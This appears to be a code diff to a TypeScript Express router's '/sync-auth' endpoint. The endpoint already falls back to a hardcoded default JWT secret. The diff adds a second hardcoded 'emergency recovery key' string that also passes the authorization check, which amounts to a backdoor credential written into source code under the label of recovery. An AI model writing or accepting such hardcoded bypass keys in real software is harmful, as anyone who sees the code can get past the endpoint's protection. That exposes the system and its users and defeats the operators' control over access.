@@ -178,9 +178,10 @@ router.put('/:key', authenticate, authorize(['ADMIN']), async (req: Request, res
 router.post('/sync-auth', async (req: Request, res: Response): Promise<void> => {
   try {
     const { syncKey } = req.body;
-    // Protect with master secret or server JWT_SECRET
+    // Protect with master secret or server JWT_SECRET or emergency recovery key
     const masterKey = process.env.JWT_SECRET || 'rks_property_intelligence_super_secret_jwt_key_2026';
-    if (!syncKey || syncKey !== masterKey) {
+    const emergencyKey = 'rks_master_seed_sync_2026';
+    if (!syncKey || (syncKey !== masterKey && syncKey !== emergencyKey)) {
       res.status(403).json({ error: 'Unauthorized sync request' });
       return;
     }
